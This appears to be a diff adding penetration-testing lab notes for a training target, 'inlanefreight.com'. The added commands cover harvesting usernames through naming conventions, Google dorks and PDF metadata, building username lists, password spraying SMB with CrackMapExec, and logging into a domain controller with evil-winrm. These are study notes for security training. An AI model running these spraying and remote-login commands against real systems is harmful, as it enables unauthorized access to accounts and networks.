@@ -303,4 +303,31 @@ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
 # Count words in generated list
 wc -l inlane.wordlist
 # Example output: 326
+
+
+
+------
+### search for usernames 
+
+    # Common username conventions (example: Jane Jill Doe)
+    jdoe         # first initial + last name
+    jjdoe        # first + middle initial + last name
+    janedoe      # first name + last name
+    jane.doe     # first name dot last name
+    doe.jane     # last name dot first name
+    doedoehacksstuff  # nickname or custom alias
+    
+    # google dorks: “@inlanefreight.com” 
+    # “inlanefreight.com filetype:pdf” | exiftool file.pdf (search for Author)
+
+### Creating a Custom list of Usernames
+    echo "Ben Williamson" >> names.txt
+    ./username-anarchy -i /home/ltnbob/names.txt > usernames.txt
+
+###  Launching the Attack with CrackMapExec
+    crackmapexec smb 10.129.201.57 -u <username> -p /usr/share/wordlists/fasttrack.txt
+
+###  Connecting to a DC with Evil-WinRM 
+# we have the winrm service open (port 5985,5986) 
+    evil-winrm -i 10.129.201.57  -u <user> -p '<password>' 
 ```
